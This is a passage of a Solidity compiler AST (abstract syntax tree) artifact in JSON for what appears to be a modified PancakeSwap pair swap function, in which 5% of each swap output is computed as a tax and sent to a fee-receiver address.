																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"nodeType": "VariableDeclarationStatement",
														"src": "12145:56:6"
													},
													{
														"assignments": [
															1881
														],
														"declarations": [
															{
																"constant": false,
																"id": 1881,
																"name": "taxamount1Out",
																"nodeType": "VariableDeclaration",
																"scope": 2006,
																"src": "12215:18:6",
																"stateVariable": false,
																"storageLocation": "default",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																},
																"typeName": {
																	"id": 1880,
																	"name": "uint",
																	"nodeType": "ElementaryTypeName",
																	"src": "12215:4:6",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																},
																"value": null,
																"visibility": "internal"
															}
														],
														"id": 1890,
														"initialValue": {
															"argumentTypes": null,
															"commonType": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															},
															"id": 1889,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"lValueRequested": false,
															"leftExpression": {
																"argumentTypes": null,
																"id": 1882,
																"name": "amount1Out",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 1825,
																"src": "12236:10:6",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"nodeType": "BinaryOperation",
															"operator": "-",
															"rightExpression": {
																"argumentTypes": null,
																"commonType": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																},
																"id": 1888,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"lValueRequested": false,
																"leftExpression": {
																	"argumentTypes": null,
																	"components": [
																		{
																			"argumentTypes": null,
																			"commonType": {
																				"typeIdentifier": "t_uint256",
																				"typeString": "uint256"
																			},
																			"id": 1885,
																			"isConstant": false,
																			"isLValue": false,
																			"isPure": false,
																			"lValueRequested": false,
																			"leftExpression": {
																				"argumentTypes": null,
																				"id": 1883,
																				"name": "amount1Out",
																				"nodeType": "Identifier",
																				"overloadedDeclarations": [],
																				"referencedDeclaration": 1825,
																				"src": "12250:10:6",
																				"typeDescriptions": {
																					"typeIdentifier": "t_uint256",
																					"typeString": "uint256"
																				}
																			},
																			"nodeType": "BinaryOperation",
																			"operator": "*",
																			"rightExpression": {
																				"argumentTypes": null,
																				"hexValue": "35",
																				"id": 1884,
																				"isConstant": false,
																				"isLValue": false,
																				"isPure": true,
																				"kind": "number",
																				"lValueRequested": false,
																				"nodeType": "Literal",
																				"src": "12263:1:6",
																				"subdenomination": null,
																				"typeDescriptions": {
																					"typeIdentifier": "t_rational_5_by_1",
																					"typeString": "int_const 5"
																				},
																				"value": "5"
																			},
																			"src": "12250:14:6",
																			"typeDescriptions": {
																				"typeIdentifier": "t_uint256",
																				"typeString": "uint256"
																			}
																		}
																	],
																	"id": 1886,
																	"isConstant": false,
																	"isInlineArray": false,
																	"isLValue": false,
																	"isPure": false,
																	"lValueRequested": false,
																	"nodeType": "TupleExpression",
																	"src": "12249:16:6",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																},
																"nodeType": "BinaryOperation",
																"operator": "/",
																"rightExpression": {
																	"argumentTypes": null,
																	"hexValue": "313030",
																	"id": 1887,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": true,
																	"kind": "number",
																	"lValueRequested": false,
																	"nodeType": "Literal",
																	"src": "12268:3:6",
																	"subdenomination": null,
																	"typeDescriptions": {
																		"typeIdentifier": "t_rational_100_by_1",
																		"typeString": "int_const 100"
																	},
																	"value": "100"
																},
																"src": "12249:22:6",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"src": "12236:35:6",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"nodeType": "VariableDeclarationStatement",
														"src": "12215:56:6"
													},
													{
														"assignments": [
															1892
														],
														"declarations": [
															{
																"constant": false,
																"id": 1892,
																"name": "_token0",
																"nodeType": "VariableDeclaration",
																"scope": 2006,
																"src": "12353:15:6",
																"stateVariable": false,
																"storageLocation": "default",
																"typeDescriptions": {
																	"typeIdentifier": "t_address",
																	"typeString": "address"
																},
																"typeName": {
																	"id": 1891,
																	"name": "address",
																	"nodeType": "ElementaryTypeName",
																	"src": "12353:7:6",
																	"stateMutability": "nonpayable",
																	"typeDescriptions": {
																		"typeIdentifier": "t_address",
																		"typeString": "address"
																	}
																},
																"value": null,
																"visibility": "internal"
															}
														],
														"id": 1894,
														"initialValue": {
															"argumentTypes": null,
															"id": 1893,
															"name": "token0",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 968,
															"src": "12371:6:6",
															"typeDescriptions": {
																"typeIdentifier": "t_address",
																"typeString": "address"
															}
														},
														"nodeType": "VariableDeclarationStatement",
														"src": "12353:24:6"
													},
													{
														"assignments": [
															1896
														],
														"declarations": [
															{
																"constant": false,
																"id": 1896,
																"name": "_token1",
																"nodeType": "VariableDeclaration",
																"scope": 2006,
																"src": "12391:15:6",
																"stateVariable": false,
																"storageLocation": "default",
																"typeDescriptions": {
																	"typeIdentifier": "t_address",
																	"typeString": "address"
																},
																"typeName": {
																	"id": 1895,
																	"name": "address",
																	"nodeType": "ElementaryTypeName",
																	"src": "12391:7:6",
																	"stateMutability": "nonpayable",
																	"typeDescriptions": {
																		"typeIdentifier": "t_address",
																		"typeString": "address"
																	}
																},
																"value": null,
																"visibility": "internal"
															}
														],
														"id": 1898,
														"initialValue": {
															"argumentTypes": null,
															"id": 1897,
															"name": "token1",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 970,
															"src": "12409:6:6",
															"typeDescriptions": {
																"typeIdentifier": "t_address",
																"typeString": "address"
															}
														},
														"nodeType": "VariableDeclarationStatement",
														"src": "12391:24:6"
													},
													{
														"expression": {
															"argumentTypes": null,
															"arguments": [
																{
																	"argumentTypes": null,
																	"commonType": {
																		"typeIdentifier": "t_bool",
																		"typeString": "bool"
																	},
																	"id": 1906,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": false,
																	"lValueRequested": false,
																	"leftExpression": {
																		"argumentTypes": null,
																		"commonType": {
																			"typeIdentifier": "t_address",
																			"typeString": "address"
																		},
																		"id": 1902,
																		"isConstant": false,
																		"isLValue": false,
																		"isPure": false,
																		"lValueRequested": false,
																		"leftExpression": {
																			"argumentTypes": null,
																			"id": 1900,
																			"name": "to",
																			"nodeType": "Identifier",
																			"overloadedDeclarations": [],
																			"referencedDeclaration": 1827,
																			"src": "12437:2:6",
																			"typeDescriptions": {
																				"typeIdentifier": "t_address",
																				"typeString": "address"
																			}
																		},
																		"nodeType": "BinaryOperation",
																		"operator": "!=",
																		"rightExpression": {
																			"argumentTypes": null,
																			"id": 1901,
																			"name": "_token0",
																			"nodeType": "Identifier",
																			"overloadedDeclarations": [],
																			"referencedDeclaration": 1892,
																			"src": "12443:7:6",
																			"typeDescriptions": {
																				"typeIdentifier": "t_address",
																				"typeString": "address"
																			}
																		},
																		"src": "12437:13:6",
																		"typeDescriptions": {
																			"typeIdentifier": "t_bool",
																			"typeString": "bool"
																		}
																	},
																	"nodeType": "BinaryOperation",
																	"operator": "&&",
																	"rightExpression": {
																		"argumentTypes": null,
																		"commonType": {
																			"typeIdentifier": "t_address",
																			"typeString": "address"
																		},
																		"id": 1905,
																		"isConstant": false,
																		"isLValue": false,
																		"isPure": false,
																		"lValueRequested": false,
																		"leftExpression": {
																			"argumentTypes": null,
																			"id": 1903,
																			"name": "to",
																			"nodeType": "Identifier",
																			"overloadedDeclarations": [],
																			"referencedDeclaration": 1827,
																			"src": "12454:2:6",
																			"typeDescriptions": {
																				"typeIdentifier": "t_address",
																				"typeString": "address"
																			}
																		},
																		"nodeType": "BinaryOperation",
																		"operator": "!=",
																		"rightExpression": {
																			"argumentTypes": null,
																			"id": 1904,
																			"name": "_token1",
																			"nodeType": "Identifier",
																			"overloadedDeclarations": [],
																			"referencedDeclaration": 1896,
																			"src": "12460:7:6",
																			"typeDescriptions": {
																				"typeIdentifier": "t_address",
																				"typeString": "address"
																			}
																		},
																		"src": "12454:13:6",
																		"typeDescriptions": {
																			"typeIdentifier": "t_bool",
																			"typeString": "bool"
																		}
																	},
																	"src": "12437:30:6",
																	"typeDescriptions": {
																		"typeIdentifier": "t_bool",
																		"typeString": "bool"
																	}
																},
																{
																	"argumentTypes": null,
																	"hexValue": "50616e63616b653a20494e56414c49445f544f",
																	"id": 1907,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": true,
																	"kind": "string",
																	"lValueRequested": false,
																	"nodeType": "Literal",
																	"src": "12469:21:6",
																	"subdenomination": null,
																	"typeDescriptions": {
																		"typeIdentifier": "t_stringliteral_2d7663edc966955a2d1409fdc782de8590859b8600a8a34482f57bae932ffa4e",
																		"typeString": "literal_string \"Pancake: INVALID_TO\""
																	},
																	"value": "Pancake: INVALID_TO"
																}
															],
															"expression": {
																"argumentTypes": [
																	{
																		"typeIdentifier": "t_bool",
																		"typeString": "bool"
																	},
																	{
																		"typeIdentifier": "t_stringliteral_2d7663edc966955a2d1409fdc782de8590859b8600a8a34482f57bae932ffa4e",
																		"typeString": "literal_string \"Pancake: INVALID_TO\""
																	}
																],
																"id": 1899,
																"name": "require",
																"nodeType": "Identifier",
																"overloadedDeclarations": [
																	2328,
																	2329
																],
																"referencedDeclaration": 2329,
																"src": "12429:7:6",
																"typeDescriptions": {
																	"typeIdentifier": "t_function_require_pure$_t_bool_$_t_string_memory_ptr_$returns$__$",
																	"typeString": "function (bool,string memory) pure"
																}
															},
															"id": 1908,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"kind": "functionCall",
															"lValueRequested": false,
															"names": [],
															"nodeType": "FunctionCall",
															"src": "12429:62:6",
															"typeDescriptions": {
																"typeIdentifier": "t_tuple$__$",
																"typeString": "tuple()"
															}
														},
														"id": 1909,
														"nodeType": "ExpressionStatement",
														"src": "12429:62:6"
													},
													{
														"condition": {
															"argumentTypes": null,
															"commonType": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															},
															"id": 1912,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"lValueRequested": false,
															"leftExpression": {
																"argumentTypes": null,
																"id": 1910,
																"name": "amount0Out",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 1823,
																"src": "12509:10:6",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"nodeType": "BinaryOperation",
															"operator": ">",
															"rightExpression": {
																"argumentTypes": null,
																"hexValue": "30",
																"id": 1911,
																"isConstant": false,
																"isLValue": false,
																"isPure": true,
																"kind": "number",
																"lValueRequested": false,
																"nodeType": "Literal",
																"src": "12522:1:6",
																"subdenomination": null,
																"typeDescriptions": {
																	"typeIdentifier": "t_rational_0_by_1",
																	"typeString": "int_const 0"
																},
																"value": "0"
															},
															"src": "12509:14:6",
															"typeDescriptions": {
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															}
														},
														"falseBody": null,
														"id": 1919,
														"nodeType": "IfStatement",
														"src": "12505:61:6",
														"trueBody": {
															"expression": {
																"argumentTypes": null,
																"arguments": [
																	{
																		"argumentTypes": null,
																		"id": 1914,
																		"name": "_token0",
																		"nodeType": "Identifier",
																		"overloadedDeclarations": [],
																		"referencedDeclaration": 1892,
																		"src": "12539:7:6",
																		"typeDescriptions": {
																			"typeIdentifier": "t_address",
																			"typeString": "address"
																		}
																	},
																	{
																		"argumentTypes": null,
																		"id": 1915,
																		"name": "to",
																		"nodeType": "Identifier",
																		"overloadedDeclarations": [],
																		"referencedDeclaration": 1827,
																		"src": "12548:2:6",
																		"typeDescriptions": {
																			"typeIdentifier": "t_address",
																			"typeString": "address"
																		}
																	},
																	{
																		"argumentTypes": null,
																		"id": 1916,
																		"name": "taxamount0Out",
																		"nodeType": "Identifier",
																		"overloadedDeclarations": [],
																		"referencedDeclaration": 1870,
																		"src": "12552:13:6",
																		"typeDescriptions": {
																			"typeIdentifier": "t_uint256",
																			"typeString": "uint256"
																		}
																	}
																],
																"expression": {
																	"argumentTypes": [
																		{
																			"typeIdentifier": "t_address",
																			"typeString": "address"
																		},
																		{
																			"typeIdentifier": "t_address",
																			"typeString": "address"
																		},
																		{
																			"typeIdentifier": "t_uint256",
																			"typeString": "uint256"
																		}
																	],
																	"id": 1913,
																	"name": "_safeTransfer",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 1070,
																	"src": "12525:13:6",
																	"typeDescriptions": {
																		"typeIdentifier": "t_function_internal_nonpayable$_t_address_$_t_address_$_t_uint256_$returns$__$",
																		"typeString": "function (address,address,uint256)"
																	}
																},
																"id": 1917,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"kind": "functionCall",
																"lValueRequested": false,
																"names": [],
																"nodeType": "FunctionCall",
																"src": "12525:41:6",
																"typeDescriptions": {
																	"typeIdentifier": "t_tuple$__$",
																	"typeString": "tuple()"
																}
															},
															"id": 1918,
															"nodeType": "ExpressionStatement",
															"src": "12525:41:6"
														}
													},
													{
														"condition": {
															"argumentTypes": null,
															"commonType": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															},
															"id": 1922,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"lValueRequested": false,
															"leftExpression": {
																"argumentTypes": null,
																"id": 1920,
																"name": "amount1Out",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 1825,
																"src": "12618:10:6",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"nodeType": "BinaryOperation",
															"operator": ">",
															"rightExpression": {
																"argumentTypes": null,
																"hexValue": "30",
																"id": 1921,
																"isConstant": false,
																"isLValue": false,
																"isPure": true,
																"kind": "number",
																"lValueRequested": false,
																"nodeType": "Literal",
																"src": "12631:1:6",
																"subdenomination": null,
																"typeDescriptions": {
																	"typeIdentifier": "t_rational_0_by_1",
																	"typeString": "int_const 0"
																},
																"value": "0"
															},
															"src": "12618:14:6",
															"typeDescriptions": {
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															}
														},
														"falseBody": null,
														"id": 1929,
														"nodeType": "IfStatement",
														"src": "12614:61:6",
														"trueBody": {
															"expression": {
																"argumentTypes": null,
																"arguments": [
																	{
																		"argumentTypes": null,
																		"id": 1924,
																		"name": "_token1",
																		"nodeType": "Identifier",
																		"overloadedDeclarations": [],
																		"referencedDeclaration": 1896,
																		"src": "12648:7:6",
																		"typeDescriptions": {
																			"typeIdentifier": "t_address",
																			"typeString": "address"
																		}
																	},
																	{
																		"argumentTypes": null,
																		"id": 1925,
																		"name": "to",
																		"nodeType": "Identifier",
																		"overloadedDeclarations": [],
																		"referencedDeclaration": 1827,
																		"src": "12657:2:6",
																		"typeDescriptions": {
																			"typeIdentifier": "t_address",
																			"typeString": "address"
																		}
																	},
																	{
																		"argumentTypes": null,
																		"id": 1926,
																		"name": "taxamount1Out",
																		"nodeType": "Identifier",
																		"overloadedDeclarations": [],
																		"referencedDeclaration": 1881,
																		"src": "12661:13:6",
																		"typeDescriptions": {
																			"typeIdentifier": "t_uint256",
																			"typeString": "uint256"
																		}
																	}
																],
																"expression": {
																	"argumentTypes": [
																		{
																			"typeIdentifier": "t_address",
																			"typeString": "address"
																		},
																		{
																			"typeIdentifier": "t_address",
																			"typeString": "address"
																		},
																		{
																			"typeIdentifier": "t_uint256",
																			"typeString": "uint256"
																		}
																	],
																	"id": 1923,
																	"name": "_safeTransfer",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 1070,
																	"src": "12634:13:6",
																	"typeDescriptions": {
																		"typeIdentifier": "t_function_internal_nonpayable$_t_address_$_t_address_$_t_uint256_$returns$__$",
																		"typeString": "function (address,address,uint256)"
																	}
																},
																"id": 1927,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"kind": "functionCall",
																"lValueRequested": false,
																"names": [],
																"nodeType": "FunctionCall",
																"src": "12634:41:6",
																"typeDescriptions": {
																	"typeIdentifier": "t_tuple$__$",
																	"typeString": "tuple()"
																}
															},
															"id": 1928,
															"nodeType": "ExpressionStatement",
															"src": "12634:41:6"
														}
													},
													{
														"condition": {
															"argumentTypes": null,
															"commonType": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															},
															"id": 1933,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"lValueRequested": false,
															"leftExpression": {
																"argumentTypes": null,
																"expression": {
																	"argumentTypes": null,
																	"id": 1930,
																	"name": "data",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 1829,
																	"src": "12727:4:6",
																	"typeDescriptions": {
																		"typeIdentifier": "t_bytes_calldata_ptr",
																		"typeString": "bytes calldata"
																	}
																},
																"id": 1931,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"lValueRequested": false,
																"memberName": "length",
																"nodeType": "MemberAccess",
																"referencedDeclaration": null,
																"src": "12727:11:6",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"nodeType": "BinaryOperation",
															"operator": ">",
															"rightExpression": {
																"argumentTypes": null,
																"hexValue": "30",
																"id": 1932,
																"isConstant": false,
																"isLValue": false,
																"isPure": true,
																"kind": "number",
																"lValueRequested": false,
																"nodeType": "Literal",
																"src": "12741:1:6",
																"subdenomination": null,
																"typeDescriptions": {
																	"typeIdentifier": "t_rational_0_by_1",
																	"typeString": "int_const 0"
																},
																"value": "0"
															},
															"src": "12727:15:6",
															"typeDescriptions": {
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															}
														},
														"falseBody": null,
														"id": 1945,
														"nodeType": "IfStatement",
														"src": "12723:237:6",
														"trueBody": {
															"expression": {
																"argumentTypes": null,
																"arguments": [
																	{
																		"argumentTypes": null,
																		"expression": {
																			"argumentTypes": null,
																			"id": 1938,
																			"name": "msg",
																			"nodeType": "Identifier",
																			"overloadedDeclarations": [],
																			"referencedDeclaration": 2325,
																			"src": "12805:3:6",
																			"typeDescriptions": {
																				"typeIdentifier": "t_magic_message",
																				"typeString": "msg"
																			}
																		},
																		"id": 1939,
																		"isConstant": false,
																		"isLValue": false,
																		"isPure": false,
																		"lValueRequested": false,
																		"memberName": "sender",
																		"nodeType": "MemberAccess",
																		"referencedDeclaration": null,
																		"src": "12805:10:6",
																		"typeDescriptions": {
																			"typeIdentifier": "t_address_payable",
																			"typeString": "address payable"
																		}
																	},
																	{
																		"argumentTypes": null,
																		"id": 1940,
																		"name": "taxamount0Out",
																		"nodeType": "Identifier",
																		"overloadedDeclarations": [],
																		"referencedDeclaration": 1870,
																		"src": "12837:13:6",
																		"typeDescriptions": {
																			"typeIdentifier": "t_uint256",
																			"typeString": "uint256"
																		}
																	},
																	{
																		"argumentTypes": null,
																		"id": 1941,
																		"name": "taxamount1Out",
																		"nodeType": "Identifier",
																		"overloadedDeclarations": [],
																		"referencedDeclaration": 1881,
																		"src": "12887:13:6",
																		"typeDescriptions": {
																			"typeIdentifier": "t_uint256",
																			"typeString": "uint256"
																		}
																	},
																	{
																		"argumentTypes": null,
																		"id": 1942,
																		"name": "data",
																		"nodeType": "Identifier",
																		"overloadedDeclarations": [],
																		"referencedDeclaration": 1829,
																		"src": "12938:4:6",
																		"typeDescriptions": {
																			"typeIdentifier": "t_bytes_calldata_ptr",
																			"typeString": "bytes calldata"
																		}
																	}
																],
																"expression": {
																	"argumentTypes": [
																		{
																			"typeIdentifier": "t_address_payable",
																			"typeString": "address payable"
																		},
																		{
																			"typeIdentifier": "t_uint256",
																			"typeString": "uint256"
																		},
																		{
																			"typeIdentifier": "t_uint256",
																			"typeString": "uint256"
																		},
																		{
																			"typeIdentifier": "t_bytes_calldata_ptr",
																			"typeString": "bytes calldata"
																		}
																	],
																	"expression": {
																		"argumentTypes": null,
																		"arguments": [
																			{
																				"argumentTypes": null,
																				"id": 1935,
																				"name": "to",
																				"nodeType": "Identifier",
																				"overloadedDeclarations": [],
																				"referencedDeclaration": 1827,
																				"src": "12768:2:6",
																				"typeDescriptions": {
																					"typeIdentifier": "t_address",
																					"typeString": "address"
																				}
																			}
																		],
																		"expression": {
																			"argumentTypes": [
																				{
																					"typeIdentifier": "t_address",
																					"typeString": "address"
																				}
																			],
																			"id": 1934,
																			"name": "ICallee",
																			"nodeType": "Identifier",
																			"overloadedDeclarations": [],
																			"referencedDeclaration": 449,
																			"src": "12760:7:6",
																			"typeDescriptions": {
																				"typeIdentifier": "t_type$_t_contract$_ICallee_$449_$",
																				"typeString": "type(contract ICallee)"
																			}
																		},
																		"id": 1936,
																		"isConstant": false,
																		"isLValue": false,
																		"isPure": false,
																		"kind": "typeConversion",
																		"lValueRequested": false,
																		"names": [],
																		"nodeType": "FunctionCall",
																		"src": "12760:11:6",
																		"typeDescriptions": {
																			"typeIdentifier": "t_contract$_ICallee_$449",
																			"typeString": "contract ICallee"
																		}
																	},
																	"id": 1937,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": false,
																	"lValueRequested": false,
																	"memberName": "pancakeCall",
																	"nodeType": "MemberAccess",
																	"referencedDeclaration": 448,
																	"src": "12760:23:6",
																	"typeDescriptions": {
																		"typeIdentifier": "t_function_external_nonpayable$_t_address_$_t_uint256_$_t_uint256_$_t_bytes_memory_ptr_$returns$__$",
																		"typeString": "function (address,uint256,uint256,bytes memory) external"
																	}
																},
																"id": 1943,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"kind": "functionCall",
																"lValueRequested": false,
																"names": [],
																"nodeType": "FunctionCall",
																"src": "12760:200:6",
																"typeDescriptions": {
																	"typeIdentifier": "t_tuple$__$",
																	"typeString": "tuple()"
																}
															},
															"id": 1944,
															"nodeType": "ExpressionStatement",
															"src": "12760:200:6"
														}
													},
													{
														"assignments": [
															1947
														],
														"declarations": [
															{
																"constant": false,
																"id": 1947,
																"name": "tax0",
																"nodeType": "VariableDeclaration",
																"scope": 2006,
																"src": "12975:9:6",
																"stateVariable": false,
																"storageLocation": "default",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																},
																"typeName": {
																	"id": 1946,
																	"name": "uint",
																	"nodeType": "ElementaryTypeName",
																	"src": "12975:4:6",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																},
																"value": null,
																"visibility": "internal"
															}
														],
														"id": 1954,
														"initialValue": {
															"argumentTypes": null,
															"commonType": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															},
															"id": 1953,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"lValueRequested": false,
															"leftExpression": {
																"argumentTypes": null,
																"components": [
																	{
																		"argumentTypes": null,
																		"commonType": {
																			"typeIdentifier": "t_uint256",
																			"typeString": "uint256"
																		},
																		"id": 1950,
																		"isConstant": false,
																		"isLValue": false,
																		"isPure": false,
																		"lValueRequested": false,
																		"leftExpression": {
																			"argumentTypes": null,
																			"id": 1948,
																			"name": "amount0Out",
																			"nodeType": "Identifier",
																			"overloadedDeclarations": [],
																			"referencedDeclaration": 1823,
																			"src": "12988:10:6",
																			"typeDescriptions": {
																				"typeIdentifier": "t_uint256",
																				"typeString": "uint256"
																			}
																		},
																		"nodeType": "BinaryOperation",
																		"operator": "*",
																		"rightExpression": {
																			"argumentTypes": null,
																			"hexValue": "35",
																			"id": 1949,
																			"isConstant": false,
																			"isLValue": false,
																			"isPure": true,
																			"kind": "number",
																			"lValueRequested": false,
																			"nodeType": "Literal",
																			"src": "13001:1:6",
																			"subdenomination": null,
																			"typeDescriptions": {
																				"typeIdentifier": "t_rational_5_by_1",
																				"typeString": "int_const 5"
																			},
																			"value": "5"
																		},
																		"src": "12988:14:6",
																		"typeDescriptions": {
																			"typeIdentifier": "t_uint256",
																			"typeString": "uint256"
																		}
																	}
																],
																"id": 1951,
																"isConstant": false,
																"isInlineArray": false,
																"isLValue": false,
																"isPure": false,
																"lValueRequested": false,
																"nodeType": "TupleExpression",
																"src": "12987:16:6",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"nodeType": "BinaryOperation",
															"operator": "/",
															"rightExpression": {
																"argumentTypes": null,
																"hexValue": "313030",
																"id": 1952,
																"isConstant": false,
																"isLValue": false,
																"isPure": true,
																"kind": "number",
																"lValueRequested": false,
																"nodeType": "Literal",
																"src": "13006:3:6",
																"subdenomination": null,
																"typeDescriptions": {
																	"typeIdentifier": "t_rational_100_by_1",
																	"typeString": "int_const 100"
																},
																"value": "100"
															},
															"src": "12987:22:6",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"nodeType": "VariableDeclarationStatement",
														"src": "12975:34:6"
													},
													{
														"assignments": [
															1956
														],
														"declarations": [
															{
																"constant": false,
																"id": 1956,
																"name": "tax1",
																"nodeType": "VariableDeclaration",
																"scope": 2006,
																"src": "13023:9:6",
																"stateVariable": false,
																"storageLocation": "default",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																},
																"typeName": {
																	"id": 1955,
																	"name": "uint",
																	"nodeType": "ElementaryTypeName",
																	"src": "13023:4:6",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																},
																"value": null,
																"visibility": "internal"
															}
														],
														"id": 1963,
														"initialValue": {
															"argumentTypes": null,
															"commonType": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															},
															"id": 1962,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"lValueRequested": false,
															"leftExpression": {
																"argumentTypes": null,
																"components": [
																	{
																		"argumentTypes": null,
																		"commonType": {
																			"typeIdentifier": "t_uint256",
																			"typeString": "uint256"
																		},
																		"id": 1959,
																		"isConstant": false,
																		"isLValue": false,
																		"isPure": false,
																		"lValueRequested": false,
																		"leftExpression": {
																			"argumentTypes": null,
																			"id": 1957,
																			"name": "amount1Out",
																			"nodeType": "Identifier",
																			"overloadedDeclarations": [],
																			"referencedDeclaration": 1825,
																			"src": "13036:10:6",
																			"typeDescriptions": {
																				"typeIdentifier": "t_uint256",
																				"typeString": "uint256"
																			}
																		},
																		"nodeType": "BinaryOperation",
																		"operator": "*",
																		"rightExpression": {
																			"argumentTypes": null,
																			"hexValue": "35",
																			"id": 1958,
																			"isConstant": false,
																			"isLValue": false,
																			"isPure": true,
																			"kind": "number",
																			"lValueRequested": false,
																			"nodeType": "Literal",
																			"src": "13049:1:6",
																			"subdenomination": null,
																			"typeDescriptions": {
																				"typeIdentifier": "t_rational_5_by_1",
																				"typeString": "int_const 5"
																			},
																			"value": "5"
																		},
																		"src": "13036:14:6",
																		"typeDescriptions": {
																			"typeIdentifier": "t_uint256",
																			"typeString": "uint256"
																		}
																	}
																],
																"id": 1960,
																"isConstant": false,
																"isInlineArray": false,
																"isLValue": false,
																"isPure": false,
																"lValueRequested": false,
																"nodeType": "TupleExpression",
																"src": "13035:16:6",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"nodeType": "BinaryOperation",
															"operator": "/",
															"rightExpression": {
																"argumentTypes": null,
																"hexValue": "313030",
																"id": 1961,
																"isConstant": false,
																"isLValue": false,
																"isPure": true,
																"kind": "number",
																"lValueRequested": false,
																"nodeType": "Literal",
																"src": "13054:3:6",
																"subdenomination": null,
																"typeDescriptions": {
																	"typeIdentifier": "t_rational_100_by_1",
																	"typeString": "int_const 100"
																},
																"value": "100"
															},
															"src": "13035:22:6",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"nodeType": "VariableDeclarationStatement",
														"src": "13023:34:6"
													},
													{
														"condition": {
															"argumentTypes": null,
															"commonType": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															},
															"id": 1966,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"lValueRequested": false,
															"leftExpression": {
																"argumentTypes": null,
																"id": 1964,
																"name": "amount0Out",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 1823,
																"src": "13076:10:6",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"nodeType": "BinaryOperation",
															"operator": ">",
															"rightExpression": {
																"argumentTypes": null,
																"hexValue": "30",
																"id": 1965,
																"isConstant": false,
																"isLValue": false,
																"isPure": true,
																"kind": "number",
																"lValueRequested": false,
																"nodeType": "Literal",
																"src": "13089:1:6",
																"subdenomination": null,
																"typeDescriptions": {
																	"typeIdentifier": "t_rational_0_by_1",
																	"typeString": "int_const 0"
																},
																"value": "0"
															},
															"src": "13076:14:6",
															"typeDescriptions": {
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															}
														},
														"falseBody": null,
														"id": 1973,
														"nodeType": "IfStatement",
														"src": "13072:60:6",
														"trueBody": {
															"expression": {
																"argumentTypes": null,
																"arguments": [
																	{
																		"argumentTypes": null,
																		"id": 1968,
																		"name": "_token0",
																		"nodeType": "Identifier",
																		"overloadedDeclarations": [],
																		"referencedDeclaration": 1892,
																		"src": "13106:7:6",
																		"typeDescriptions": {
																			"typeIdentifier": "t_address",
																			"typeString": "address"
																		}
																	},
																	{
																		"argumentTypes": null,
																		"id": 1969,
																		"name": "FeeResiver",
																		"nodeType": "Identifier",
																		"overloadedDeclarations": [],
																		"referencedDeclaration": 950,
																		"src": "13115:10:6",
																		"typeDescriptions": {
																			"typeIdentifier": "t_address",
																			"typeString": "address"
																		}
																	},
